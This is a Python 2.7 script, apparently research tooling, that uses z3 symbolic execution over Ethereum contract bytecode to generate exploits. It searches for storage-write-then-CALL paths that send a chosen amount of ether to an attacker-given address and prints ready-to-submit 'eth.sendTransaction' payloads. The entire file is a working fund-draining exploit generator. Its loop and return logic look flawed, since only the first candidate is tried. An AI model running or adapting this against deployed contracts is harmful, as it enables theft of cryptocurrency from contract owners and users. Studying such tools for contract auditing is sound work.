#!/usr/bin/env python2.7
import logging
import sys
from binascii import unhexlify, hexlify

from z3 import z3

from ethanalyze.constraints import model_to_calls, check_and_model, check_model_and_resolve
from ethanalyze.evm import concrete, CombinedSymbolicResult
from ethanalyze.project import Project

logging.basicConfig(level=logging.DEBUG)


def store_call_exploit(code, target_addr, target_amount, amount_check='+'):
    p = Project(code)
    call_ins = p.cfg.filter_ins('CALL')
    if not call_ins:
        logging.info('No CALL instructions')
        return
    logging.info('Found %d CALL instructions', len(call_ins))
    store_ins = p.filter_ins('SSTORE')
    if not store_ins:
        logging.info('No SSTORE instructions')
        return
    logging.info('Found %d SSTORE instructions', len(store_ins))
    for call, call_path, call_r in p.get_constraints(call_ins, [1,2]):
        for sstore, sstore_path, store_r in p.get_constraints(store_ins, [0,1], inclusive=True):
            combined = CombinedSymbolicResult()
            combined.prepend(call_r)
            combined.prepend(store_r)
            combined.simplify()

            addr = z3.simplify(combined.states[1].stack[-2])
            amount = z3.simplify(combined.states[1].stack[-3])

            extra_constraints = []

            if not concrete(addr):
                extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
            else:
                if addr != target_addr:
                    continue

            if not concrete(amount):
                if amount_check == '+':
                    extra_constraints.append(amount >= target_amount)
                elif amount_check == '-':
                    extra_constraints.append(amount <= target_amount)
                else:
                    extra_constraints.append(amount == target_amount)

            # model = check_and_model(combined.constraints + extra_constraints, combined.sha_constraints)
            model = check_model_and_resolve(combined.constraints + extra_constraints, combined.sha_constraints)

        return model_to_calls(model), combined, model
    logging.info('Could not exploit any SSTORE+CALL')
    return



def main():
    if len(sys.argv) < 4:
        print 'Usage: %s <code> <target-address> <amount>' % sys.argv[0]
        exit(-1)
    with open(sys.argv[1]) as infile:
        inbuffer = infile.read().rstrip()
    amount_check = '='
    amount = sys.argv[3].strip()
    if amount[0] in ('=', '+', '-'):
        amount_check = amount[0]
        amount = amount[1:]
    amount = int(amount)
    code = unhexlify(inbuffer)
    result = store_call_exploit(code, int(sys.argv[2], 16), amount, amount_check)
    if result:
        call, r, model = result
        print call
        print
        for c in call:
            print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"})' % (
                int(sys.argv[2], 16), hexlify(c['payload']))


if __name__ == '__main__':
    main()
